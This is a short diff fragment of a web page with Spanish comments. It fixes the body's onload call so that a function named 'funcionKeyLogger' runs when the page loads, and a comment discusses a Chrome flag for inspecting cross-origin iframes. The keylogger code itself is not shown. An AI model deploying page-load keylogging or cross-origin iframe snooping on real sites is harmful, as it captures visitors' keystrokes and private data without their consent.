@@ -52,7 +52,7 @@ function accederIframes(){
 
 </script>
 
-<body onload="fun ionKeyLogger()">
+<body onload="funcionKeyLogger()">
 <!-- Con este parametro SI permitiría un navegador chrome inspeccionar componentes
 	de un iframe cuyo source se ha obtenido de otros dominios, por lo que un 
 	usuario podria sentarse	en nuestro sitio y ejecutarnos el chrome con este 
